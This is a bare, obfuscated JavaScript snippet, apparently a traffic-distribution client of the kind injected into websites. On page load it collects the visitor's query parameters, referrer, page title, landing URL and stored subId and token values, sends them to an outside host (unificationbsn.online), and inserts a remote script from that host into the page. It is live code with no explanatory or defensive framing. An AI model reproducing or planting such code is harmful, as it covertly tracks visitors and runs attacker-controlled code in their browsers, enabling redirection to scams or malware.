  (function() {
    var name = '_BTGczCwZSr2zp4ff';
    if (!window._BTGczCwZSr2zp4ff) {
        window._BTGczCwZSr2zp4ff = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/Marokko',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _wDYjKQsxZcN1Xq34 = localStorage.getItem('config');
    if (typeof _wDYjKQsxZcN1Xq34 !== 'undefined' && _wDYjKQsxZcN1Xq34 !== null) {
        var _xfrWJtbyMydTxsGr = JSON.parse(_wDYjKQsxZcN1Xq34);
        var _KwMS4bbf5FpdrxRk = Math.round(+new Date()/1000);
        if (_xfrWJtbyMydTxsGr.created_at + window._BTGczCwZSr2zp4ff.ttl < _KwMS4bbf5FpdrxRk) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _3JHTrg1Y6MHYDvXG = localStorage.getItem('subId');
    var _ZDh8sjF8NMMcGV8g = localStorage.getItem('token');
    var _S4P8R4ZmntcHgpw8 = '?return=js.client';
        _S4P8R4ZmntcHgpw8 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _S4P8R4ZmntcHgpw8 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _S4P8R4ZmntcHgpw8 += '&default_keyword=' + encodeURIComponent(document.title);
        _S4P8R4ZmntcHgpw8 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _S4P8R4ZmntcHgpw8 += '&name=' + encodeURIComponent(name);
        _S4P8R4ZmntcHgpw8 += '&host=' + encodeURIComponent(window._BTGczCwZSr2zp4ff.R_PATH);
    if (typeof _3JHTrg1Y6MHYDvXG !== 'undefined' && _3JHTrg1Y6MHYDvXG && window._BTGczCwZSr2zp4ff.unique) {
        _S4P8R4ZmntcHgpw8 += '&sub_id=' + encodeURIComponent(_3JHTrg1Y6MHYDvXG);
    }
    if (typeof _ZDh8sjF8NMMcGV8g !== 'undefined' && _ZDh8sjF8NMMcGV8g && window._BTGczCwZSr2zp4ff.unique) {
        _S4P8R4ZmntcHgpw8 += '&token=' + encodeURIComponent(_ZDh8sjF8NMMcGV8g);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._BTGczCwZSr2zp4ff.R_PATH + _S4P8R4ZmntcHgpw8;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
